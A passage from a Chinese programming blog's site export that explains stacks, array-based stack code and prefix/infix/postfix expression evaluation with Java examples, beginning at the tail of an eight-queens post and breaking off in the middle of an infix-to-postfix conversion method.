class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">++count;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">System.out.print(arr[i] + <span class="string">&quot;  &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h2><p>….</p><p>….</p><p>解法一共有92种<br>判断冲突一共有15720次</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 递归 </tag>
            
            <tag> 迷宫回溯问题 </tag>
            
            <tag> 八皇后问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈实现综合计算器</title>
      <link href="/posts/1fac/"/>
      <url>/posts/1fac/</url>
      
        <content type="html"><![CDATA[<h1 id="栈的介绍"><a href="#栈的介绍" class="headerlink" title="栈的介绍"></a>栈的介绍</h1><blockquote><ol><li>栈的英文为(<strong>stack</strong>)</li><li>栈是一个<strong>先入后出</strong>(FILO-First In Last Out)的有序列表。</li><li>栈(stack)是限制线性表中元素的插入和删除只能在线性表的同一端进行的一种特殊线性表。允许插入和删除的一端，为<strong>变化的一端，称为栈顶</strong>(Top)，另一端为<strong>固定的一端，称为栈底</strong>(Bottom)。</li><li>根据栈的定义可知，最先放入栈中元素在栈底，最后放入的元素在栈顶，而删除元素刚好相反，最后放入的元素最先删除，最先放入的元素最后删除。</li><li>栈的插入操作(<strong>push</strong>)，称压栈、入栈。类似子弹入弹夹。<br> 栈的删除操作(<strong>pop</strong>)，叫作出栈，也有的叫作弹栈。如同弹夹中的子弹出夹。</li></ol></blockquote><h2 id="栈的顺序存储结构"><a href="#栈的顺序存储结构" class="headerlink" title="栈的顺序存储结构"></a>栈的顺序存储结构</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200727181634.png"></p><h2 id="栈的链式存储结构"><a href="#栈的链式存储结构" class="headerlink" title="栈的链式存储结构"></a>栈的链式存储结构</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200727181718.png"></p><h2 id="栈的应用场景"><a href="#栈的应用场景" class="headerlink" title="栈的应用场景"></a>栈的应用场景</h2><blockquote><ol><li>子程序的调用：在跳往子程序前，会先将下个指令的地址存到堆栈中，直到子程序执行完后再将地址取出， 回到原来的程序中。 </li><li>处理递归调用：和子程序的调用类似，只是除了储存下一个指令的地址外，也将参数、区域变量等数据存入堆栈中。</li><li>表达式的转换[中缀表达式转后缀表达式]与求值(实际解决)。</li><li>二叉树的遍历。</li><li>图形的深度优先(depth一first)搜索法。</li></ol></blockquote><h2 id="用数组模拟栈"><a href="#用数组模拟栈" class="headerlink" title="用数组模拟栈"></a>用数组模拟栈</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayStackDemo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 测试一下ArrayStack 是否正确</span></span><br><span class="line"><span class="comment">// 先创建一个ArrayStack对象-&gt;表示栈</span></span><br><span class="line"><span class="type">ArrayStack</span> <span class="variable">stack</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayStack</span>(<span class="number">4</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">loop</span> <span class="operator">=</span> <span class="literal">true</span>; <span class="comment">// 控制是否退出菜单</span></span><br><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (loop) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;show: 表示显示栈&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;exit: 退出程序&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;push: 表示添加数据到栈(入栈)&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;pop: 表示从栈取出数据(出栈)&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;请输入你的选择&quot;</span>);</span><br><span class="line">key = scanner.next();</span><br><span class="line"><span class="keyword">switch</span> (key) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;show&quot;</span>:</span><br><span class="line">stack.list();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;push&quot;</span>:</span><br><span class="line">System.out.println(<span class="string">&quot;请输入一个数&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">stack.push(value);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;pop&quot;</span>:</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">System.out.printf(<span class="string">&quot;出栈的数据是 %d\n&quot;</span>, res);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">System.out.println(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">scanner.close();</span><br><span class="line">loop = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;程序退出~~~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个 ArrayStack 表示栈</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ArrayStack</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> maxSize; <span class="comment">// 栈的大小</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span>[] stack; <span class="comment">// 数组，数组模拟栈，数据就放在该数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">top</span> <span class="operator">=</span> -<span class="number">1</span>;<span class="comment">// top表示栈顶，初始化为-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造器</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ArrayStack</span><span class="params">(<span class="type">int</span> maxSize)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.maxSize = maxSize;</span><br><span class="line">stack = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="built_in">this</span>.maxSize];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 栈满</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isFull</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> top == maxSize - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 栈空</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> top == -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入栈-push</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line"><span class="comment">// 先判断栈是否满</span></span><br><span class="line"><span class="keyword">if</span> (isFull()) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;栈满&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">top++;</span><br><span class="line">stack[top] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 出栈-pop, 将栈顶的数据返回</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 先判断栈是否空</span></span><br><span class="line"><span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line"><span class="comment">// 抛出异常</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;栈空，没有数据~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> stack[top];</span><br><span class="line">top--;</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示栈的情况[遍历栈]， 遍历时，需要从栈顶开始显示数据</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">list</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;栈空，没有数据~~&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 需要从栈顶开始显示数据</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> top; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;stack[%d]=%d\n&quot;</span>, i, stack[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="前缀表达式（波兰式）"><a href="#前缀表达式（波兰式）" class="headerlink" title="前缀表达式（波兰式）"></a>前缀表达式（波兰式）</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>前缀表达式又称波兰式，前缀表达式的运算符位于操作数之前。<br>举例说明： (3+4)×5-6 对应的前缀表达式就是 - × + 3 4 5 6</p></blockquote><h2 id="前缀表达式的计算机求值"><a href="#前缀表达式的计算机求值" class="headerlink" title="前缀表达式的计算机求值"></a>前缀表达式的计算机求值</h2><p>从右至左扫描表达式，遇到数字时，将数字压入堆栈，遇到运算符时，弹出栈顶的两个数，用运算符对它们做相应的计算（栈顶元素 和 次顶元素），并将结果入栈；重复上述过程直到表达式最左端，最后运算得出的值即为表达式的结果。</p><blockquote><p>例如: (3+4)×5-6 对应的前缀表达式就是 - × + 3 4 5 6 , 针对前缀表达式求值步骤如下:</p><ol><li>从右至左扫描，将6、5、4、3压入堆栈</li><li>遇到+运算符，因此弹出3和4（3为栈顶元素，4为次顶元素），计算出3+4的值，得7，再将7入栈</li><li>接下来是×运算符，因此弹出7和5，计算出7×5&#x3D;35，将35入栈</li><li>最后是-运算符，计算出35-6（<strong>栈顶元素 - 次顶元素</strong>）的值，即29，由此得出最终结果</li></ol></blockquote><h1 id="中缀表达式"><a href="#中缀表达式" class="headerlink" title="中缀表达式"></a>中缀表达式</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>中缀表达式就是常见的运算表达式，如(3+4)×5-6</p></blockquote><h2 id="中缀表达式的计算机求值"><a href="#中缀表达式的计算机求值" class="headerlink" title="中缀表达式的计算机求值"></a>中缀表达式的计算机求值</h2><p>使用栈完成中缀表达式的计算思路:</p><blockquote><ol><li><p>需要创建两个栈：数栈存放数字，符号栈存放运算符</p></li><li><p>通过一个 index  值（索引），来遍历我们的表达式</p></li><li><p>如果我们发现是一个数字, 就直接入数栈</p></li><li><p>如果发现扫描到是一个运算符,  就分如下情况:</p><p>如果当前的符号栈为空，就直接入栈。</p><p>如果符号栈有运算符，就进行比较：①当前运算符的优先级  <strong>&lt;&#x3D;**  栈中的操作符， 就需要从数栈中pop出两个数,再从符号栈中pop出一个运算符，进行运算，将得到结果压入数栈，然后将当前运算符压入符号栈。②当前运算符的优先级  **&gt;</strong>  栈中的操作符， 就直接入符号栈。</p></li><li><p>当表达式扫描完毕，就顺序的从数栈和符号栈中pop出相应的数和符号，并运行</p></li><li><p>最后在数栈只有一个数字，就是表达式的结果</p></li></ol></blockquote><h1 id="后缀表达式（逆波兰表达式）"><a href="#后缀表达式（逆波兰表达式）" class="headerlink" title="后缀表达式（逆波兰表达式）"></a>后缀表达式（逆波兰表达式）</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>后缀表达式又称逆波兰表达式,与前缀表达式相似，只是运算符位于操作数之后</p><p>举例说明： (3+4)×5-6 对应的后缀表达式就是 3 4 + 5 × 6 –</p></blockquote><h2 id="后缀表达式的计算机求值"><a href="#后缀表达式的计算机求值" class="headerlink" title="后缀表达式的计算机求值"></a>后缀表达式的计算机求值</h2><p>从左至右扫描表达式，遇到数字时，将数字压入堆栈，遇到运算符时，弹出栈顶的两个数，用运算符对它们做相应的计算（次顶元素 和 栈顶元素），并将结果入栈；重复上述过程直到表达式最右端，最后运算得出的值即为表达式的结果。</p><blockquote><p>例如: (3+4)×5-6 对应的后缀表达式就是 3 4 + 5 × 6 - , 针对后缀表达式求值步骤如下:</p><ol><li>从左至右扫描，将3和4压入堆栈；</li><li>遇到+运算符，因此弹出4和3（4为栈顶元素，3为次顶元素），计算出3+4的值，得7，再将7入栈；</li><li>将5入栈；</li><li>接下来是×运算符，因此弹出5和7，计算出7×5&#x3D;35，将35入栈；</li><li>将6入栈；</li><li>最后是-运算符，计算出35-6的值（<strong>次顶元素 - 栈顶元素</strong>），即29，由此得出最终结果</li></ol><p></p></blockquote><h2 id="逆波兰计算器的实现"><a href="#逆波兰计算器的实现" class="headerlink" title="逆波兰计算器的实现"></a>逆波兰计算器的实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PolandNotation</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 后缀表达式为9 3 1 - 3 * + 10 2 / +    中缀表达式为9+(3-1)*3+10/2=20</span></span><br><span class="line"><span class="type">String</span> <span class="variable">suffixExpression</span> <span class="operator">=</span> <span class="string">&quot;9 3 1 - 3 * + 10 2 / +&quot;</span>;</span><br><span class="line">List&lt;String&gt; list = getListString(suffixExpression);</span><br><span class="line">System.out.println(calculate(list));</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 一个后缀表达式， 依次将数据和运算符放入到ArrayList中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title function_">getListString</span><span class="params">(String suffixExpression)</span> &#123;</span><br><span class="line">String[] split = suffixExpression.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"><span class="keyword">for</span> (String ele : split) &#123;</span><br><span class="line">list.add(ele);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 根据逆波兰表达式求值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">calculate</span><span class="params">(List&lt;String&gt; list)</span> &#123;</span><br><span class="line">Stack&lt;String&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;String&gt;();</span><br><span class="line"><span class="keyword">for</span> (String item : list) &#123;</span><br><span class="line">            <span class="comment">// 正则表达式，匹配是否为数字</span></span><br><span class="line"><span class="keyword">if</span> (item.matches(<span class="string">&quot;\\d+&quot;</span>)) &#123;</span><br><span class="line">stack.push(item);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> Integer.valueOf(stack.pop());<span class="comment">//栈顶元素</span></span><br><span class="line"><span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span> Integer.valueOf(stack.pop());<span class="comment">//次顶元素</span></span><br><span class="line"><span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (item.equals(<span class="string">&quot;+&quot;</span>)) &#123;</span><br><span class="line">result = num1 + num2;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (item.equals(<span class="string">&quot;*&quot;</span>)) &#123;</span><br><span class="line">result = num1 * num2;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (item.equals(<span class="string">&quot;-&quot;</span>)) &#123;<span class="comment">//注意减数和被减数</span></span><br><span class="line">result = num2 - num1;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (item.equals(<span class="string">&quot;/&quot;</span>)) &#123;<span class="comment">//注意除数和被除数</span></span><br><span class="line">result = num2 / num1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;程序有异常！！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">stack.push(result + <span class="string">&quot;&quot;</span>);<span class="comment">//将数字型转换为字符串型</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> Integer.valueOf(stack.pop());<span class="comment">//栈中最后一个元素即为结果</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="将中缀表达式转换为后缀表达式"><a href="#将中缀表达式转换为后缀表达式" class="headerlink" title="将中缀表达式转换为后缀表达式"></a>将中缀表达式转换为后缀表达式</h2><p><code>中缀表达式“9+(3-1)×3+10÷2”转化为后缀表达式“9 3 1 - 3 * + 10 2 / +”。</code></p><p>规则：从左到右遍历中缀表达式的每个数字和符号，若是数字就输出，即成为后缀表达式的一部分；若是符号，则判断其与栈顶符号的优先级，是右括号或优先级低于栈顶符号（乘除优先加减）则栈顶元素依次出栈并输出，并将当前符号进栈，一直到最终输出后缀表达式为止。</p><p><strong>思路：</strong></p><blockquote><ol><li><p>初始化：运算符栈stack和动态数组(ArrayList) list；</p></li><li><p>从左至右扫描中缀表达式；</p></li><li><p>遇到操作数时，将其添加到list中；</p></li><li><p>遇到运算符时，比较其与stack栈顶运算符的优先级：</p></li></ol><ul><li>如果stack为空，或栈顶运算符为左括号“(”，则直接将此运算符入栈；</li><li>如果优先级比栈顶运算符的高，也将运算符压入stack；</li><li>如果优先级比栈顶运算符的低，将stack栈中的<strong>所有运算符</strong>弹出并追加到list中。</li></ul><ol start="5"><li>遇到括号时：</li></ol><ul><li><p>如果是左括号“(”，则直接压入stack;</p></li><li><p>如果是右括号“)”，则依次弹出stack栈顶的运算符，并追加到list中，直到遇到左括号为止，此时将这一对括号丢弃。</p></li></ul><ol start="6"><li>从左至右扫描中缀表达式结束后，将stack中剩余的运算符依次追加到list中。</li></ol></blockquote><p><strong>代码实现：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PolandNotation</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">infixExpression</span> <span class="operator">=</span> <span class="string">&quot;9+(3-1)*3+10/2&quot;</span>;</span><br><span class="line">List&lt;String&gt; ls = toInfixExpressionList(infixExpression);</span><br><span class="line">List&lt;String&gt; list = parseSuffixExpreesionList(ls);</span><br><span class="line">System.out.println(ls);</span><br><span class="line">System.out.println(list);</span><br><span class="line">System.out.println(calculate(list));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">priority</span><span class="params">(String s)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (s.equals(<span class="string">&quot;*&quot;</span>) || s.equals(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (s.equals(<span class="string">&quot;+&quot;</span>) || s.equals(<span class="string">&quot;-&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//将中缀表达式放入到ArrayList中，进行数据处理</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title function_">toInfixExpressionList</span><span class="params">(String s)</span> &#123;</span><br><span class="line">List&lt;String&gt; ls = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// 这时是一个指针，用于遍历中缀表达式字符串</span></span><br><span class="line">String str; <span class="comment">// 对多位数的拼接</span></span><br><span class="line"><span class="type">char</span> c; <span class="comment">// 每遍历到一个字符，就放入到c</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="comment">// 如果c是一个非数字，需要加入到ls</span></span><br><span class="line"><span class="keyword">if</span> ((c = s.charAt(i)) &lt; <span class="number">48</span> || (c = s.charAt(i)) &gt; <span class="number">57</span>) &#123;</span><br><span class="line">ls.add(<span class="string">&quot;&quot;</span> + c);</span><br><span class="line">i++; <span class="comment">// i需要后移</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果是一个数，需要考虑多位数</span></span><br><span class="line">str = <span class="string">&quot;&quot;</span>; <span class="comment">// 先将str 置成&quot;&quot; &#x27;0&#x27;[48]-&gt;&#x27;9&#x27;[57]</span></span><br><span class="line"><span class="keyword">while</span> (i &lt; s.length() &amp;&amp; (c = s.charAt(i)) &gt;= <span class="number">48</span> &amp;&amp; (c = s.charAt(i)) &lt;= <span class="number">57</span>) &#123;</span><br><span class="line">str += c;<span class="comment">// 拼接</span></span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">ls.add(str);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt; s.length());</span><br><span class="line"><span class="keyword">return</span> ls;<span class="comment">// 返回</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title 